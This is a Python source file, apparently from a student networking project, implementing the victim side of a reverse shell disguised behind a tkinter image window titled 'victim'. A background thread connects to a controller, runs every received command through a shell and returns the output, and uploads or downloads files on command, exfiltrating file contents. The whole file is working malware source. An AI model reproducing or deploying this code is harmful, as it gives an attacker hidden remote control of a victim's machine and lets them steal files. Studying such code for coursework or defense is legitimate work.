import socket
import threading
import tkinter as tk
import subprocess
import os
import time


HOST=socket.gethostbyname(socket.gethostname())
PORT=12345
client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_file_number=0


def run_command(command:str):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        
        if result.returncode == 0:
            return result.stdout.strip()  
        else:
            return f"Error executing command: {result.stderr.strip()}"
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.stderr.strip()}"



def uploading_a_file(_request:str):
    words=_request.split()   
    print(words[1])
    filename=words[1]
    file=open(words[2]+filename,"wb")
    file_bytes=b""
    done=False
    while not done:
        data=client.recv(1024)
        if file_bytes[-5:]==b"<END>":
            done=True
        else:
            file_bytes +=data
            if file_bytes[-5:]==b"<END>":
                done=True
    file_bytes=file_bytes[:-5]
    file.write(file_bytes)
    file.close()
    print("file closed")




def downloading_a_file(_request:str):
    words=_request.split()
    print(words[1])
    final_name_manipulating=words[1].split("/")
    final_name=final_name_manipulating[-1]
    file=open(words[1],"rb")
    print('client_'+final_name)
    name='client_'+final_name
    client.send(name.encode())
    time.sleep(1)
    data=file.read()
    print(data)
    client.sendall(data)
    print("data sent")
    client.send(b"<END>")
    print("the code sent")
    file.close()


def sending_all(_request=str):
    words=_request.split()
    final_request=words[1]
    output=run_command(final_request)
    print(output)

def background():
    client.connect((HOST,PORT))
    print("connectd sucssefully!!")
    while True:
        request=client.recv(1024).decode()
        print(request)
        if 'sendall' in request:
            sending_all(request)
        elif 'download' in request:
            downloading_a_file(request)
        elif 'upload' in request:
            uploading_a_file(request)
        else:
            output=run_command(request)
            client.sendall(output.encode())


        

def front():
    root=tk.Tk()
    root.title("victim")
    root.geometry("1000x450")
    photo=tk.PhotoImage(file="/home/saman/Documents/GitHub/IUT/Network/Reverse_shell_virus/photo.png")
    label=tk.Label(root,image=photo,width=1000,height=450,bg="black",fg="yellow")
    label.pack()
    root.mainloop()



def start():
    background_thread=threading.Thread(target=background)
    background_thread.start()
    front_thread=threading.Thread(target=front)
    front_thread.start()
    


start()